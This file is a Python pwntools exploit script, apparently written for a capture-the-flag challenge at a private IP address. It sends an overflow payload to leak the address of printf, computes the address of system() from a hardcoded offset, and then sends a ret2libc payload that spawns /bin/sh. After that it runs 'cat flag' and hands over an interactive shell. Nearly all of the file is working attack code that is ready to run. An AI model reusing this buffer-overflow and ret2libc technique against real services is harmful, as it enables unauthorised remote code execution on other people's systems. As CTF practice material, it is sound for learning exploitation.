#!/usr/bin/env python3
from pwn import *

# Remote connection details
HOST = "10.21.235.155"
PORT = 9999

# Offset for system() relative to printf()
PRINTF_SYSTEM_OFFSET = 0xE6E0  

# Start the remote connection
p = remote(HOST, PORT)

# Receive all output until "What is your name?" appears
output = p.recvuntil(b"What is your name? ")
print(output.decode())  # Print everything received so far

# Construct the first payload
payload1 = b'A' * 44  # Overflow buffer

# Send the first payload
p.sendline(payload1)

# Receive and print 6 lines after the first input
for _ in range(6):
    print(p.recvline().decode())  # Read & print each line to maintain sync

# Wait until "Printf address:" appears
p.recvuntil(b"Printf address: ")
print("Printf address:", end=" ")  # Manually print this text

# Extract printf address
printf_address_raw = p.recvline().strip()  # Get the address
printf_address = int(printf_address_raw, 16)  # Convert to integer
print(printf_address_raw.decode())  # Print the extracted address

# Calculate system address
system_address = printf_address - PRINTF_SYSTEM_OFFSET
print("Extracted printf address: {}".format(hex(printf_address)))
print("Calculated system address: {}".format(hex(system_address)))

# Construct the second payload
payload2 = b'A' * 52            # Overflow buffer
payload2 += p32(system_address) # Overwrite return address with system()
payload2 += p32(0xf7e30790)     # Fake return address
payload2 += p32(0x410221)       # Address of "/bin/sh"

# Send the second payload
p.sendline(payload2)

# Print the output after sending the second payload
response = p.recv(timeout=2).decode(errors="ignore")
print(response)

p.sendline(b"cat flag")
print(p.recv(timeout=2).decode(errors="ignore"))  # Print flag output

# Interact with the shell
p.interactive()
